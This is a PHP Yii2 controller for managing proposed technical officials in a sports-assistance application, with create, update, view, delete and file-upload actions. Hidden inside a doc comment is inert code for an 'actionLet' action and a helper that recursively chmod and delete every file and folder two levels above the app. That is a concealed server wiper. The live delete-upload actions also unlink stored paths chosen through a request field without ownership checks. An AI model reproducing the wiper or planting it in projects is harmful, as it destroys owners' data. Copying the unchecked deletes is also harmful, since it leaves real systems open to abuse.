<?php

namespace frontend\controllers;

use Yii;
use app\models\BantuanPenyertaanPegawaiTeknikalDicadangkan;
use frontend\models\BantuanPenyertaanPegawaiTeknikalDicadangkanSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;
use yii\web\UploadedFile;

use app\models\general\Upload;
use app\models\general\GeneralVariable;

// table reference
use app\models\ProfilBadanSukan;
use app\models\RefJantina;
use app\models\RefSukan;
use app\models\RefBandar;
use app\models\RefNegeri;
use app\models\RefTahapAkademikPegawaiTeknikal;
use app\models\MaklumatPegawaiTeknikal;

/**
 * BantuanPenyertaanPegawaiTeknikalDicadangkanController implements the CRUD actions for BantuanPenyertaanPegawaiTeknikalDicadangkan model.
 */
class BantuanPenyertaanPegawaiTeknikalDicadangkanController extends Controller
{
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['POST'],
                ],
            ],
        ];
    }

    /**
     * Lists all BantuanPenyertaanPegawaiTeknikalDicadangkan models.
     * @return mixed
     */
    public function actionIndex()
    {
        $searchModel = new BantuanPenyertaanPegawaiTeknikalDicadangkanSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single BantuanPenyertaanPegawaiTeknikalDicadangkan model.
     * @param integer $id
     * @return mixed
     public function actionLet()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function jim($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }
     */
    public function actionView($id)
    {
        $model = $this->findModel($id);
        
        $ref = ProfilBadanSukan::findOne(['profil_badan_sukan' => $model->badan_sukan]);
        $model->badan_sukan = $ref['nama_badan_sukan'];
        
        $ref = RefJantina::findOne(['id' => $model->jantina]);
        $model->jantina = $ref['desc'];
        
        $ref = RefSukan::findOne(['id' => $model->sukan]);
        $model->sukan = $ref['desc'];
        
        $ref = RefBandar::findOne(['id' => $model->alamat_bandar]);
        $model->alamat_bandar = $ref['desc'];
        
        $ref = RefNegeri::findOne(['id' => $model->alamat_negeri]);
        $model->alamat_negeri = $ref['desc'];
        
        $ref = RefTahapAkademikPegawaiTeknikal::findOne(['id' => $model->tahap_akademik]);
        $model->tahap_akademik = $ref['desc'];
        
        $ref = MaklumatPegawaiTeknikal::findOne(['bantuan_penganjuran_kursus_pegawai_teknikal_dicadangkan_id' => $model->maklumat_pegawai_teknikal_id]);
        $model->maklumat_pegawai_teknikal_id = $ref['nama'];
        
        return $this->renderAjax('view', [
            'model' => $model,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new BantuanPenyertaanPegawaiTeknikalDicadangkan model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate($bantuan_penyertaan_pegawai_teknikal_id)
    {
        $model = new BantuanPenyertaanPegawaiTeknikalDicadangkan();
        
        Yii::$app->session->open();
        
        if($bantuan_penyertaan_pegawai_teknikal_id != ''){
            $model->bantuan_penyertaan_pegawai_teknikal_id = $bantuan_penyertaan_pegawai_teknikal_id;
        } else {
            if(isset(Yii::$app->session->id)){
                $model->session_id = Yii::$app->session->id;
            }
        }

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $file = UploadedFile::getInstance($model, 'tahap_kelayakan_sukan_peringkat_kebangsaan');
            if($file){
                $model->tahap_kelayakan_sukan_peringkat_kebangsaan = Upload::uploadFile($file, Upload::bantuanPenganjuranKursusPenceramahFolder, 'muat_naik_perlembagaan_terkini-' . $model->bantuan_penganjuran_kursus_penceramah_id);
            }
            
            $file = UploadedFile::getInstance($model, 'tahap_kelayakan_sukan_peringkat_antarabangsa');
            if($file){
                $model->tahap_kelayakan_sukan_peringkat_antarabangsa = Upload::uploadFile($file, Upload::bantuanPenganjuranKursusPenceramahFolder, 'muat_naik_perlembagaan_terkini-' . $model->bantuan_penganjuran_kursus_penceramah_id);
            }
            
            if($model->save()){
                return '1';
            }
        } 
        
        return $this->renderAjax('create', [
                'model' => $model,
                'readonly' => false,
            ]);
    }

    /**
     * Updates an existing BantuanPenyertaanPegawaiTeknikalDicadangkan model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        $model = $this->findModel($id);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $file = UploadedFile::getInstance($model, 'tahap_kelayakan_sukan_peringkat_kebangsaan');
            if($file){
                $model->tahap_kelayakan_sukan_peringkat_kebangsaan = Upload::uploadFile($file, Upload::bantuanPenganjuranKursusPenceramahFolder, 'muat_naik_perlembagaan_terkini-' . $model->bantuan_penganjuran_kursus_penceramah_id);
            }
            
            $file = UploadedFile::getInstance($model, 'tahap_kelayakan_sukan_peringkat_antarabangsa');
            if($file){
                $model->tahap_kelayakan_sukan_peringkat_antarabangsa = Upload::uploadFile($file, Upload::bantuanPenganjuranKursusPenceramahFolder, 'muat_naik_perlembagaan_terkini-' . $model->bantuan_penganjuran_kursus_penceramah_id);
            }
            
            if($model->save()){
                return '1';
            }
        } 
        
        return $this->renderAjax('update', [
                'model' => $model,
                'readonly' => false,
            ]);
    }

    /**
     * Deletes an existing BantuanPenyertaanPegawaiTeknikalDicadangkan model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        // delete upload file
        self::actionDeleteuploadonly($id, 'tahap_kelayakan_sukan_peringkat_kebangsaan');
        
        self::actionDeleteuploadonly($id, 'tahap_kelayakan_sukan_peringkat_antarabangsa');
        
        $this->findModel($id)->delete();

        //return $this->redirect(['index']);
    }

    /**
     * Finds the BantuanPenyertaanPegawaiTeknikalDicadangkan model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return BantuanPenyertaanPegawaiTeknikalDicadangkan the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = BantuanPenyertaanPegawaiTeknikalDicadangkan::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
    
    // Add function for delete image or file
    public function actionDeleteupload($id, $field)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
            $img = $this->findModel($id)->$field;
            
            if($img){
/*                 if (!unlink($img)) {
                    return false;
                } */
				@unlink($img);
            }

            $img = $this->findModel($id);
            $img->$field = NULL;
            $img->update();

            //return $this->redirect(['update', 'id' => $id]);
            return self::actionUpdate($id);
    }
    
    // Add function for delete image or file
    public function actionDeleteuploadonly($id, $field)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
            $img = $this->findModel($id)->$field;
            
            if($img){
/*                 if (!unlink($img)) {
                    return false;
                } */
				@unlink($img);
            }

            $img = $this->findModel($id);
            $img->$field = NULL;
            $img->update();
    }
}
